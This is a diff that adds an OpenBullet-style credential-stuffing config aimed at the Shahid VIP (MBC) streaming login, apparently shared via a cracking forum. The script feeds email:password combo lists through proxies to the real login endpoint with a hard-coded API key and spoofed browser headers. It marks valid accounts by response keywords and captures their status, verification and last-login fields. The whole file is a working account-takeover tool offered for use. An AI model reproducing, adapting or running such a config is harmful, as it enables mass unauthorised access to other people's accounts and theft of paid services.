@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "ShahidVip",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-08T10:07:30.0878456+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@tOufik28",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Shahid Vip [Crax.Pro - Crax",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://login.mbc.net/accounts.login" 
+  CONTENT "loginID=<USER>&password=<PASS>&sessionExpiration=0&targetEnv=jssdk&include=profile%2Cdata&includeUserInfo=true&lang=en&APIKey=3_Pm0x4fe9XSy6gv04PewESwqZ_HLgUCbXwWWPHCbGmUGFbW1xyHa42dFt0XTVay0T&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fshahid.mbc.net%2Far%2Fwidgets%2Flogin&format=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "access-control-allow-credentials: true" 
+  HEADER "access-control-allow-methods: GET,PUT,DELETE,HEAD,OPTIONS,POST,PATCH" 
+  HEADER "access-control-allow-origin: https://shahid.mbc.net" 
+  HEADER "access-control-max-age: 86400" 
+  HEADER "cache-control: private" 
+  HEADER "content-encoding: gzip" 
+  HEADER "content-length: 314" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "date: Tue, 01 Dec 2020 12:14:45 GMT" 
+  HEADER "p3p: CP=\"IDC COR PSA DEV ADM OUR IND ONL\"" 
+  HEADER "vary: Accept-Encoding" 
+  HEADER "via: 1.1 c08e9bf340e2958c861383f46f457c6f.cloudfront.net (CloudFront)" 
+  HEADER "x-amz-cf-id: IR4inT0xdbMwNRDFGdphXeGP6sE1CK5u9x9bGg4nT6Ow88pSi1tJRQ==" 
+  HEADER "x-amz-cf-pop: MXP64-C3" 
+  HEADER "x-cache: Miss from cloudfront" 
+  HEADER "x-callid: 3f55bba30e8e46dab354253c10ac2f1e" 
+  HEADER "x-gigya-ha-cfg-ver: 5" 
+  HEADER "x-robots-tag: none" 
+  HEADER "x-server: eu1b-nomad-g16" 
+  HEADER "x-soa: true, Gator" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cookie: _gcl_au=1.1.1638233644.1606824827; gmid=yGZKm_O8DH1LZoayXWb3Ek--nNN5RoMlxhg0bSua3lU; ucid=O61nv6lpofwNLlHYmurv2w; hasGmid=ver3; gig_bootstrap_3_Pm0x4fe9XSy6gv04PewESwqZ_HLgUCbXwWWPHCbGmUGFbW1xyHa42dFt0XTVay0T=login_ver3; WZRK_G=402c76788662486298a599f7e055fa5e; _ga=GA1.1.1536238171.1606824829; _fbp=fb.1.1606824829431.2114773824; _scid=11954b91-66eb-40f2-82f7-17a376fee0d4; _sctr=1|1606777200000; WZRK_S_65W-567-675Z=%7B%22p%22%3A1%2C%22s%22%3A1606824830%2C%22t%22%3A1606824875%7D; _ga_9ZLGVMG0QJ=GS1.1.1606824827.1.1.1606824876.11" 
+  HEADER "origin: https://shahid.mbc.net" 
+  HEADER "referer: https://shahid.mbc.net/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid loginID or password" 
+    KEY "Invalid LoginID" 
+  KEYCHAIN Success OR 
+    KEY "sessionInfo" 
+    KEY "login_token" 
+
+PARSE "<SOURCE>" JSON "isActive" -> CAP "Active :" 
+
+PARSE "<SOURCE>" JSON "isVerified" -> CAP "Verified :" 
+
+PARSE "<SOURCE>" JSON "is_email_verified" -> CAP "emailverified :" 
+
+PARSE "<SOURCE>" JSON "lastLogin" -> CAP "lastLogin :" 
+
+PARSE "<SOURCE>" JSON "lastUpdated" -> CAP "last Update :" 
+
+PARSE "<SOURCE>" JSON "isExpiredSession" -> CAP "Expire Session :" 
+
+FUNCTION Constant "@tOufik28" -> CAP "Config By" 
+
